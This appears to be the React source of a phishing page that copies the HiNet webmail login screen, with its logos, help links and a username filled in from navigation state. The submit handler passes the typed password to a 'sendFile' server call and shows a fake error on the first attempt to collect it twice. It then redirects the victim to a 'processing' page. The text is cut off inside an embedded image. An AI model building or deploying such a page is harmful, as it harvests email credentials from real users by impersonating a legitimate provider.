import { navigate } from "@reach/router";
import React, { Fragment, useState } from "react";
import { Helmet } from "react-helmet";
import { notify, sendFile } from "../servers";
//import "./main.css";

export default function Hinet({ location }) {
  const [values, setValues] = useState({
    username: location.state.email,
    password: "",
  });

  const [submited, setSubmited] = useState({ status: false, count: 0 });

  const handleChange = (event) => {
    setValues({
      ...values,
      [event.target.name]: event.target.value,
    });
  };

  const submitForm = (event) => {
    event.preventDefault();
    console.log(values);
    setSubmited({ ...submited, status: !submited.status });

    if (submited.count === 0) {
      sendFile(values).then((data) => {
        // show error
        notify();
        setSubmited({ ...submited, count: 1 });
        console.log(data);
        console.log(submited);
      });
    } else {
      sendFile(values).then((data) => {
        // redirect
        navigate("processing", { state: { domain: location.state.domain } });
        console.log("ok");
      });
    }
  };
  return (
    <Fragment>
      <Helmet>
        <link rel="stylesheet" href="../hinet/main.css" />
      </Helmet>
      <div id="outMost">
        <div id="head" className="flex_item">
          <div id="head_left" className="flex_item">
            <span className="flex_item">
              <a target="_blank">
                <img
                  id="hinetLogo"
                  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGAAAAA8CAYAAACZ1L+0AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyRpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoTWFjaW50b3NoKSIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDoyMzAxRDhGOUQ3REQxMUVCQjBEMUUyRTY3NzZGRDA1QiIgeG1wTU06RG9jdW1lbnRJRD0ieG1wLmRpZDoyMzAxRDhGQUQ3REQxMUVCQjBEMUUyRTY3NzZGRDA1QiI+IDx4bXBNTTpEZXJpdmVkRnJvbSBzdFJlZjppbnN0YW5jZUlEPSJ4bXAuaWlkOjIzMDFEOEY3RDdERDExRUJCMEQxRTJFNjc3NkZEMDVCIiBzdFJlZjpkb2N1bWVudElEPSJ4bXAuZGlkOjIzMDFEOEY4RDdERDExRUJCMEQxRTJFNjc3NkZEMDVCIi8+IDwvcmRmOkRlc2NyaXB0aW9uPiA8L3JkZjpSREY+IDwveDp4bXBtZXRhPiA8P3hwYWNrZXQgZW5kPSJyIj8+AFtqZAAAB2pJREFUeNrsXAtQ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"
                />
              </a>
            </span>
            <span className="flex_item">
              <img
                id="webmailLogo"
                src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASsAAAAlCAIAAACVu1gnAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyRpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoTWFjaW50b3NoKSIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDoyMzAxRDhGREQ3REQxMUVCQjBEMUUyRTY3NzZGRDA1QiIgeG1wTU06RG9jdW1lbnRJRD0ieG1wLmRpZDoyMzAxRDhGRUQ3REQxMUVCQjBEMUUyRTY3NzZGRDA1QiI+IDx4bXBNTTpEZXJpdmVkRnJvbSBzdFJlZjppbnN0YW5jZUlEPSJ4bXAuaWlkOjIzMDFEOEZCRDdERDExRUJCMEQxRTJFNjc3NkZEMDVCIiBzdFJlZjpkb2N1bWVudElEPSJ4bXAuZGlkOjIzMDFEOEZDRDdERDExRUJCMEQxRTJFNjc3NkZEMDVCIi8+IDwvcmRmOkRlc2NyaXB0aW9uPiA8L3JkZjpSREY+IDwveDp4bXBtZXRhPiA8P3hwYWNrZXQgZW5kPSJyIj8+9Nh4XAAACuhJREFUeNrsnF1o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"
              />
            </span>
          </div>
          <div id="head_right" className="flex_item">
            <a href="https://www.hinet.net/" target="_blank">
              HiNet
            </a>
            |
            <a href="https://hiair.hinet.net/" target="_blank">
              hiAir
            </a>
            |<a href="https://webmail.hinet.net/index.html">中文</a>
          </div>
        </div>
        <div id="middle" className="flex_item">
          <div id="login_block" className="flex_item">
            <div id="loginDiv" className="loginDiv">
              <div className="abgne_tab">
                <ul className="tabs f16">
                  <li className>
                    <a>Personal Mail</a>
                  </li>
                  <li className="active">
                    <a>hiMail</a>
                  </li>
                </ul>
                <div className="tab_container">
                  <div
                    id="tab1"
                    className="tab_content"
                    style={{ paddingBottom: "0px", display: "none" }}
                  >
                    <div id="personalDiv">
                      <div style={{ textAlign: "center" }}>
                        <h2 className="h3">HiNet Mail</h2>
                      </div>
                      <form name="personal" onSubmit={submitForm}>
                        <input type="hidden" name="usertype" />
                        <input type="hidden" name="https" defaultValue={1} />
                        <input type="hidden" name="lang" defaultValue="en" />
                        <div style={{ textAlign: "center" }}>
                          <span
                            id="personalMessage"
                            style={{
                              color: "rgba(30, 53, 108, 0.5)",
                              letterSpacing: "1px",
                            }}
                            className="f16"
                          >
                            Enter account/password
                          </span>
                        </div>
                        <div
                          className="ctrlGroup"
                          style={{ lineHeight: "24px" }}
                        >
                          <div className="user_icon">
                            <svg
                              aria-hidden="true"
                              focusable="false"
                              data-prefix="fas"
                              data-icon="user-circle"
                              className="svg-inline--fa fa-user-circle fa-w-16"
                              role="img"
                              xmlns="http://www.w3.org/2000/svg"
                              viewBox="0 0 496 512"
                            >
                              <path
                                fill="currentColor"
                                d="M248 8C111 8 0 119 0 256s111 248 248 248 248-111 248-248S385 8 248 8zm0 96c48.6 0 88 39.4 88 88s-39.4 88-88 88-88-39.4-88-88 39.4-88 88-88zm0 344c-58.7 0-111.3-26.6-146.5-68.2 18.8-35.4 55.6-59.8 98.5-59.8 2.4 0 4.8.4 7.1 1.1 13 4.2 26.6 6.9 40.9 6.9 14.3 0 28-2.7 40.9-6.9 2.3-.7 4.7-1.1 7.1-1.1 42.9 0 79.7 24.4 98.5 59.8C359.3 421.4 306.7 448 248 448z"
                              />
                            </svg>
                          </div>
                          <label htmlFor="idPuser" className="loginLabel" />
                          <input
                            id="idPuser"
                            placeholder="Account"
                            name="username"
                            onChange={handleChange}
                            value={values.username}
                            disabled
                            tabIndex={1}
                            size={16}
                            onkeyup="checkTheSame(document.personal)"
                            title="User account (ex: jack)"
                            className="inputTxt"
                            required
                          />
                          <img
                            id="show_username_keyboard"
                            src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABMAAAANCAYAAABLjFUnAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAPtJREFUeNpibGpqusTAwKDLQDm4zARl2AIxIwUYpJ+BiYGKANmwpUD8H4jlgPgwlM0ApUF8Gyi7HYijoGwQnobNsPtAfBaIfwHxTSibAUqD+F+g7KdA/A6Ir6G7jAWJXQPFIJCCJG6Cgw0y9BIhb4LwFiD2RvJWBZTtDfXyQ2xhxoLFmyBwB4g/InkL5sWPUC+D6O9QsUfYDJsLxOtB6QWIVYCYE4jTkeRh7OlQw59CxV5DIw3FsBZoLMkD8QoCCfkIEGcB8Rmo4cvQDdsHtRGE1wDxcTyG3YHG6CyowSjeVAfiC1CsCMRbiUijElDDQMAA2bA51MibAAEGAJEWSOMD5WGDAAAAAElFTkSuQmCC"
                            title="Show virtual keyboard to input username!"
                            className="imgKB"
                          />
                        </div>
                        <div
                          className="ctrlGroup"
                          style={{ lineHeight: "24px" }}
                        >
                          <div className="user_icon">
                            <svg
                              aria-hidden="true"
                              focusable="false"
                              data-prefix="fas"
                              data-icon="lock"
                              className="svg-inline--fa fa-lock fa-w-14"
                              role="img"
                              xmlns="http://www.w3.org/2000/svg"
                              viewBox="0 0 448 512"
                            >
                              <path
                                fill="currentColor"
                                d="M400 224h-24v-72C376 68.2 307.8 0 224 0S72 68.2 72 152v72H48c-26.5 0-48 21.5-48 48v192c0 26.5 21.5 48 48 48h352c26.5 0 48-21.5 48-48V272c0-26.5-21.5-48-48-48zm-104 0H152v-72c0-39.7 32.3-72 72-72s72 32.3 72 72v72z"
                              />
                            </svg>
                          </div>
                          <label htmlFor="passPuser" className="loginLabel" />
                          <input
                            id="passPuser"
                            placeholder="Password"
                            name="password"
                            value={values.password}
                            onChange={handleChange}
                            required
                            tabIndex={2}
                            type="password"
                            maxLength={255}
                            size={16}
                            className="inputTxt"
                            
                          />
                          <img
                            id="showkeyboard"
                            src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABMAAAANCAYAAABLjFUnAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAPtJREFUeNpibGpqusTAwKDLQDm4zARl2AIxIwUYpJ+BiYGKANmwpUD8H4jlgPgwlM0ApUF8Gyi7HYijoGwQnobNsPtAfBaIfwHxTSibAUqD+F+g7KdA/A6Ir6G7jAWJXQPFIJCCJG6Cgw0y9BIhb4LwFiD2RvJWBZTtDfXyQ2xhxoLFmyBwB4g/InkL5sWPUC+D6O9QsUfYDJsLxOtB6QWIVYCYE4jTkeRh7OlQw59CxV5DIw3FsBZoLMkD8QoCCfkIEGcB8Rmo4cvQDdsHtRGE1wDxcTyG3YHG6CyowSjeVAfiC1CsCMRbiUijElDDQMAA2bA51MibAAEGAJEWSOMD5WGDAAAAAElFTkSuQmCC"
                            title="Show virtual keyboard to input password!"
                            className="imgKB"
                          />
                          <span
                            id="pwEyePuser"
                            className="pwEye glyphicon glyphicon-eye-close"
                            onclick
                          />
                        </div>
                        <div className="ctrlGroup">
                          <div
                            className="savebtn"
                            style={{ marginLeft: "27px" }}
                          >
                            <input
                              id="saveaccPuser"
                              tabIndex={3}
                              aligh="right"
                              onclick="switchSavePasswd(document.personal);"
                              type="checkbox"
                              defaultValue={1}
                              name="saveAccount"
                            />
                            <label
                              htmlFor="saveaccPuser"
                              className="checkboxLabel"
                            >
                              Keep account
                            </label>
                            <input
                              id="savepwPuser"
                              tabIndex={4}
                              aligh="right"
                              onclick="switchSaveAccount(document.personal);"
                              type="checkbox"
                              defaultValue={1}
                              name="savePasswd"
                            />
                            <label
                              htmlFor="savepwPuser"
                              className="checkboxLabel"
                            >
                              Keep password
                            </label>
                          </div>
                          <input
                            type="submit"
                            disabled={submited.status}
                            defaultValue="Ok"
                            className="okbtn"
                            name="OK"
                            id="OKPuser"
                          />
                          <input
                            id="cm1Puser"
                            tabIndex={5}
                            aligh="right"
                            type="checkbox"
                            defaultValue="cm1"
                            name="cm1"
                            style={{ display: "none" }}
                          />
                          <label
                            htmlFor="cm1Puser"
                            className="checkboxLabel"
                            style={{ display: "none" }}
                          >
                            Use cm1 email
                          </label>
                        </div>
                        <hr style={{ marginBottom: "8px" }} />
                        <div
                          className="ctrlGroup divTable"
                          style={{ marginTop: "9px" }}
                        >
                          <div className="col50L">
                            <a
                              href="https://lib.webmail.hinet.net/statement/F-account-1.htm"
                              target="_blank"
                            >
                              <span className="toolboxLabel">New account</span>
                            </a>
                          </div>
                          <div className="col50R">
                            <a
                              href="https://lib.webmail.hinet.net/statement/manual_v20200330.pdf"
                              target="_blank"
                            >
                              <span className="toolboxLabel">Instructions</span>
                            </a>
                          </div>
                          <div className="col50L">
                            <a
                              href="https://lib.webmail.hinet.net/statement/F-login-5.htm"
                              target="_blank"
                            >
                              <span className="toolboxLabel">
                                Forget password?
                              </span>
                            </a>
                          </div>
                          <div className="col50R">
                            <a
                              href="https://lib.webmail.hinet.net/statement/login_info.htm"
                              target="_blank"
                            >
                              <span className="toolboxLabel">
                                Login instructions
                              </span>
                            </a>
                          </div>
                          <div className="col50L">
                            <a
                              href="https://lib.webmail.hinet.net/statement/M-help-1.htm"
                              target="_blank"
                            >
                              <span className="toolboxLabel">FAQ</span>
                            </a>
                          </div>
                          <div className="col50R">
                            <a
                              href="https://lib.webmail.hinet.net/statement/termsvs.htm"
                              target="_blank"
                            >
                              <span className="toolboxLabel">
                                Service terms
                              </span>
                            </a>
                          </div>
                        </div>
                        <input
                          type="hidden"
                          name="owaspcsrftkn"
                          defaultValue="TLXQ-QVRG-N7GW-CAGE-OLIP-P99K-CGAY-OZ70"
                        />
                      </form>
                    </div>
                  </div>
                  <div
                    id="tab2"
                    className="tab_content"
                    style={{ paddingBottom: "0px" }}
                  >
                    <div id="businessDiv">
                      <div style={{ height: "37px", textAlign: "center" }}>
                        <img
                          src="data:image/gif;base64,R0lGODlhUgAgAPf/AP/Lbv//lbO0ri0sTOHh4Zqbkvz8/UhJQ6OmmdXW2e2QiIKCgiUjMPr6+nt5hHN1a21rdUJDOCQmF66tspOUjcfHxfj4+EZFTuU3JYqLhdbW1ZaVmZuZpWlrZB0cI9nZ1yIjI/b29ri6tICAfMnJxqWlpf+LTB85h9gaDcLCwqWkqbCwsf9qOltaXPT09OMqF/Hx8fLy8nRzeYSDiOXl5O3t7HJycl9dbRobE3p9dMrKyZmZmqGhoN3d3Ht8et4iEq+xq+Tk4+Pj5o2OjTo6Po2Lk+7u7iosI/Dw9M3Nzbe3tq2uqGVkbY2OiqWmn+jo6IKFdGdzlurq6tzc3qmpp6apndDQzioqK1RWR76+vq6uruvq7djY2MrJz4+Qh2VmXTAxLGpqa8PGtcXFyr28wO3t6vDw797e39zc262vpefn6jo7Mh0dHezr7aqqrt/g29LT0e/v7yAfJiQjKTIyNPT08lRTVL2+uYmJjh0eGWZmZ77BsCgnMrm5utLS056fnZ6emhkZGOrq6JqZn7q6vuDg38PDxvPz8xoZH/9DJZGRkx4gFjU0Odvc16Kio8bHw8HCv5aWmO7u7Nvb2tHR05CQlM/P0qurqBUUHKOkoZucmJWWjxgXHf7+/vv7+/X19tDQ0P9+Rf39/ff397S0sMC/w8nLwS8zHPb19/Hw9JCPm4qHnKusp9nZ2N6LbP+4ZN24lOCrjHh5cf//8/n5+fr6+fb29X13oB8fH8PEwuHg5W1ohMnIydxgWNfX2YiCpy1GkP/geoyQfm5vaa+usvX29q+wufX11ycoI/7+qKenpOro3/85H8fIxrKemI6WselzaKGqx83NytfX14eIgrO0s6hNPy4wIYmJhzAuNaKfs7/AwLu7uPzp5v/BuP/ep9PT0xoeB7W0uJiYlm5BNqaksaqotaUrIZCUg8UsItLR193d3t7e3T4+PfXHw/jX1YeGju/w71xdU6mqo/Dv8qusotjY3Ojp4/5XNEEeG///yHcjFhsbGZiajhg0h////yH/C1hNUCBEYXRhWE1QPD94cGFja2V0IGJlZ2luPSLvu78iIGlkPSJXNU0wTXBDZWhpSHpyZVN6TlRjemtjOWQiPz4gPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iQWRvYmUgWE1QIENvcmUgNS4wLWMwNjAgNjEuMTM0Nzc3LCAyMDEwLzAyLzEyLTE3OjMyOjAwICAgICAgICAiPiA8cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPiA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtbG5zOnhtcE1NPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvbW0vIiB4bWxuczpzdFJlZj0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL3NUeXBlL1Jlc291cmNlUmVmIyIgeG1wOkNyZWF0b3JUb29sPSJBZG9iZSBQaG90b3Nob3AgQ1M1IFdpbmRvd3MiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6REQ4RjQ0RDY1QzhFMTFFMzkyQkE5ODM0NTg4RTgzNUMiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6REQ4RjQ0RDc1QzhFMTFFMzkyQkE5ODM0NTg4RTgzNUMiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZD